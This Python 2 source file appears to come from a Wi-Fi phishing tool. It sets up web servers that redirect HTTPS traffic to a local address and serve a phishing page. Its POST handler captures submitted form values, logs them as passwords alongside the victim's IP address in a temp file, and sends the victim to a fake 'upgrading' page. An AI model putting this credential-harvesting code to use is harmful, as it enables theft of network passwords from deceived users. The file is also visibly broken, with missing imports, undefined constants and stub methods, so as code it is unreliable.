import sys
import SocketServer
import BaseHTTPServer
import SimpleHTTPServer


class WebServer:
    def __init__(self):
        self.http_server = None
        self.https_server = None

    def start_http_server(self, port):
        sys.stdout.write('[\033[32m+\033[0m] HTTP Server Running\n')

    def stop_http_sertver():
        pass

    def start_https_server(self, port):
        sys.stdout.write('[\033[32m+\033[0m] HTTPS Server Running\n')

    def stop_https_server():
        pass


class _SecureHTTPServer(BaseHTTPServer.HTTPServer):
    def __init__(self, server_address, HandlerClass, fpem):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        self.socket = ssl.SSLSocket(
            socket.socket(self.address_family, self.socket_type),
            keyfile=fpem,
            certfile=fpem)
        self.server_bind()
        self.server_activate()

    def serve_forever(self):
        self.stop = False
        while not self.stop:
            self.handle_request()


class _SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_QUIT(self):
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://10.0.0.1:' + str(PORT))
        self.end_headers()

    def log_message(self, format, *args):
        return


class _HTTPServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self):
        self.stop = False
        while not self.stop:
            self.handle_request()


class _HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_QUIT(self):
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):
        if self.path == "/":
            with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                               self.client_address[0] + W + "\n"
                               )
                log_file.close()
            self.path = "index.html"
        self.path = "%s/%s" % (PHISING_PAGE, self.path)

        if self.path.endswith(".html"):
            if not os.path.isfile(self.path):
                self.send_response(404)
                return
            f = open(self.path)
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()
            return
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            if item.value:
                if re.match("\A[\x20-\x7e]+\Z", item.value):
                    self.send_response(301)
                    self.send_header('Location', '/upgrading.html')
                    self.end_headers()
                    with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                       T + self.client_address[0] +
                                       R + " password=" + item.value +
                                       W + "\n"
                                       )
                        log_file.close()
                    return

    def log_message(self, format, *args):
        return


